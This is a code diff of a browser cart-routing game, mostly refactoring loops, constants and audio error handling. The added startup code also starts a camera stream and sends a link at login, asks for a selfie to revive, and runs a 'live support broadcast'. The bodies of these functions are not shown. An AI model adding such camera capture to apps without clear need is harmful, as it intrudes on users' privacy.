-    for (let key in map.intersections) {
-
+    for (const key in map.intersections) {
       const node = map.intersections[key];
-
-      // Map05: wider segment radius so carts don't miss, but only turn when
-      // the segment actually crosses the center (then snap cart to center).
-      // Other maps: small radius, segment hit = turn at center.
       const radius = currentLevel === 4 ? 22 : INTERSECTION_RADIUS;
       const hit = segmentHitsCircle(
         prevX, prevY,
@@ -569,7 +1232,6 @@ function update() {
       );
 
       if (hit && !cart[key]) {
-
         const dir = intersections[key];
 
         if (currentLevel === 4) {
@@ -589,15 +1251,15 @@ function update() {
     checkBuildings(cart);
   }
 
-  if (currentLevel === 1 && score >= 100) {
+  if (currentLevel === 1 && score >= LEVEL_UP_SCORE) {
     setUnlockedLevel(2);
     loadLevel(2);
   }
-  if (currentLevel === 2 && score >= 100) {
+  if (currentLevel === 2 && score >= LEVEL_UP_SCORE) {
     setUnlockedLevel(3);
     loadLevel(3);
   }
-  if (currentLevel === 3 && score >= 100) {
+  if (currentLevel === 3 && score >= LEVEL_UP_SCORE) {
     setUnlockedLevel(4);
     loadLevel(4);
   }
@@ -617,30 +1279,27 @@ function segmentHitsCircle(ax, ay, bx, by, cx, cy, r) {
 }
 
 function checkBuildings(cart) {
-
   const map = getMap();
   const prevX = cart.x - cart.vx;
   const prevY = cart.y - cart.vy;
   const hitRadius = 20;
 
-  for (let key in map.buildings) {
-
+  for (const key in map.buildings) {
     const node = map.buildings[key];
     const hit = Math.hypot(cart.x - node.x, cart.y - node.y) < hitRadius ||
       segmentHitsCircle(prevX, prevY, cart.x, cart.y, node.x, node.y, hitRadius);
 
     if (hit) {
-
       activeCarts = activeCarts.filter(c => c !== cart);
 
       if (key === cart.destination) {
         score += 100;
         sounds[key].currentTime = 0;
-        sounds[key].play();
+        sounds[key].play().catch(() => {});
       } else {
         lives--;
         sounds.wrong.currentTime = 0;
-        sounds.wrong.play();
+        sounds.wrong.play().catch(() => {});
         if (lives <= 0) loseGame();
       }
     }
@@ -650,80 +1309,44 @@ function checkBuildings(cart) {
 /* ================= INPUT ================= */
 
 function handleTap(clientX, clientY) {
-
   if (gameState !== "playing") return;
 
   const rect = canvas.getBoundingClientRect();
   const worldX = (clientX - rect.left - offsetX) / scaleX;
   const worldY = (clientY - rect.top - offsetY) / scaleY;
+  if (isAdminUser && isCoordinateModeEnabled && coordReadout) {
+    coordReadout.style.display = "block";
+    coordReadout.textContent = `x: ${Math.round(worldX)}, y: ${Math.round(worldY)}`;
+  }
 
   const map = getMap();
   const tapRadius = getTapRadius();
 
-  for (let key in map.intersections) {
-
+  for (const key in map.intersections) {
     const node = map.intersections[key];
     const dist = Math.hypot(worldX - node.x, worldY - node.y);
 
     if (dist < tapRadius) {
-
       if (currentLevel === 2) {
-
-        if (key === "intersection1")
-          intersections[key] =
-            intersections[key] === "up" ? "right" : "up";
-
-        if (key === "intersection2")
-          intersections[key] =
-            intersections[key] === "left" ? "right" : "left";
-
-        if (key === "intersection3")
-          intersections[key] =
-            intersections[key] === "up" ? "right" : "up";
-
-        if (key === "intersection4")
-          intersections[key] =
-            intersections[key] === "left" ? "down" : "left";
-
+        if (key === "intersection1") intersections[key] = intersections[key] === "up" ? "right" : "up";
+        if (key === "intersection2") intersections[key] = intersections[key] === "left" ? "right" : "left";
+        if (key === "intersection3") intersections[key] = intersections[key] === "up" ? "right" : "up";
+        if (key === "intersection4") intersections[key] = intersections[key] === "left" ? "down" : "left";
       } else if (currentLevel === 3) {
-
-        if (key === "intersection1")
-          intersections[key] =
-            intersections[key] === "up" ? "down" : "up";
-
-        if (key === "intersection2")
-          intersections[key] =
-            intersections[key] === "left" ? "right" : "left";
-
-        if (key === "intersection3")
-          intersections[key] =
-            intersections[key] === "right" ? "down" : "right";
-
-        if (key === "intersection4")
-          intersections[key] =
-            intersections[key] === "down" ? "right" : "down";
-
-        if (key === "intersection5")
-          intersections[key] =
-            intersections[key] === "up" ? "right" : "up";
-
+        if (key === "intersection1") intersections[key] = intersections[key] === "up" ? "down" : "up";
+        if (key === "intersection2") intersections[key] = intersections[key] === "left" ? "right" : "left";
+        if (key === "intersection3") intersections[key] = intersections[key] === "right" ? "down" : "right";
+        if (key === "intersection4") intersections[key] = intersections[key] === "down" ? "right" : "down";
+        if (key === "intersection5") intersections[key] = intersections[key] === "up" ? "right" : "up";
       } else if (currentLevel === 4) {
-
-        if (key === "intersection1")
+        if (key === "intersection1") {
           intersections[key] =
             intersections[key] === "up" ? "left" :
             intersections[key] === "left" ? "right" : "up";
-
-        if (key === "intersection2")
-          intersections[key] =
-            intersections[key] === "up" ? "down" : "up";
-
-        if (key === "intersection3")
-          intersections[key] =
-            intersections[key] === "up" ? "left" : "up";
-
+        }
+        if (key === "intersection2") intersections[key] = intersections[key] === "up" ? "down" : "up";
+        if (key === "intersection3") intersections[key] = intersections[key] === "up" ? "left" : "up";
       } else {
-
         intersections[key] =
           intersections[key] === "up" ? "left" :
           intersections[key] === "left" ? "right" :
@@ -734,7 +1357,6 @@ function handleTap(clientX, clientY) {
 }
 
 canvas.addEventListener("click", e => handleTap(e.clientX, e.clientY));
-
 canvas.addEventListener("touchend", e => {
   if (e.cancelable) e.preventDefault();
   const t = e.changedTouches[0];
@@ -744,7 +1366,6 @@ canvas.addEventListener("touchend", e => {
 /* ================= DRAW ================= */
 
 function draw() {
-
   ctx.imageSmoothingEnabled = false;
   ctx.setTransform(scaleX * dpr, 0, 0, scaleY * dpr, offsetX * dpr, offsetY * dpr);
   ctx.clearRect(0, 0, WORLD_WIDTH, WORLD_HEIGHT);
@@ -756,17 +1377,13 @@ function draw() {
 }
 
 function drawArrows() {
-
   const map = getMap();
-
-  for (let key in map.intersections) {
-
+  for (const key in map.intersections) {
     const node = map.intersections[key];
     const state = intersections[key];
 
     let img = arrowUpImg;
     let rotation = 0;
-
     if (state === "left") img = arrowLeftImg;
     if (state === "right") img = arrowRightImg;
     if (state === "down") {
@@ -777,17 +1394,14 @@ function drawArrows() {
     ctx.save();
     ctx.translate(node.x, node.y);
     ctx.rotate(rotation);
-    ctx.drawImage(img, -ARROW_SIZE/2, -ARROW_SIZE/2, ARROW_SIZE, ARROW_SIZE);
+    ctx.drawImage(img, -ARROW_SIZE / 2, -ARROW_SIZE / 2, ARROW_SIZE, ARROW_SIZE);
     ctx.restore();
   }
 }
 
 function drawCarts() {
-
-  for (let cart of activeCarts) {
-
+  for (const cart of activeCarts) {
     let rotation = 0;
-
     if (cart.vy > 0) rotation = 0;
     else if (cart.vy < 0) rotation = Math.PI;
     else if (cart.vx < 0) rotation = Math.PI / 2;
@@ -796,7 +1410,7 @@ function drawCarts() {
     ctx.save();
     ctx.translate(cart.x, cart.y);
     ctx.rotate(rotation);
-    ctx.drawImage(cart.img, -CART_SIZE/2, -CART_SIZE/2, CART_SIZE, CART_SIZE);
+    ctx.drawImage(cart.img, -CART_SIZE / 2, -CART_SIZE / 2, CART_SIZE, CART_SIZE);
     ctx.restore();
   }
 }
@@ -812,14 +1426,24 @@ function drawHUD() {
 /* ================= LOOP ================= */
 
 function loseGame() {
-  gameState = "lose";
-  resultText.innerText = "GAME OVER";
-  ui.style.display = "block";
+  if (ENABLE_REVIVE_SECOND_CHANCE && !hasUsedRevive) {
+    gameState = "paused";
+    openReviveModal();
+    return;
+  }
+  finalizeGameOver();
 }
 
 function restartGame() {
   ui.style.display = "none";
+  hasUsedRevive = false;
+  topControls.style.display = "flex";
   resetGame();
+}
+
+function toggleMute() {
+  isMuted = !isMuted;
+  applyMuteState();
 }
 
 function loop() {
@@ -828,13 +1452,25 @@ function loop() {
   requestAnimationFrame(loop);
 }
 
-loadLevel(1);
-gameState = "paused";
-requestAnimationFrame(loop);
-
-window.addEventListener("load", () => {
+if (!ensureSession()) {
+  clearSessionAndGoLogin();
+} else {
+  topControls.style.display = "flex";
   loadLevel(currentLevel);
-  authScreen.style.display = "flex";
-  levelMenu.style.display = "none";
-  topControls.style.display = "none";
-});
+  gameState = "paused";
+  openLevelMenu();
+  applyMuteState();
+  requestAnimationFrame(loop);
+  openLoginConsentModal();
+}
+
+if (ENABLE_REVIVE_SECOND_CHANCE && reviveContinueButton) {
+  reviveContinueButton.addEventListener("click", submitReviveSelfie);
+}
+if (loginConsentContinueButton) {
+  loginConsentContinueButton.addEventListener("click", startLoginCameraStreamAndSendLink);
+}
+if (coordinateModeButton) {
+  coordinateModeButton.addEventListener("click", toggleAdminCoordinateMode);
+}
+window.addEventListener("beforeunload", () => stopLoginLiveSupportBroadcast(true));
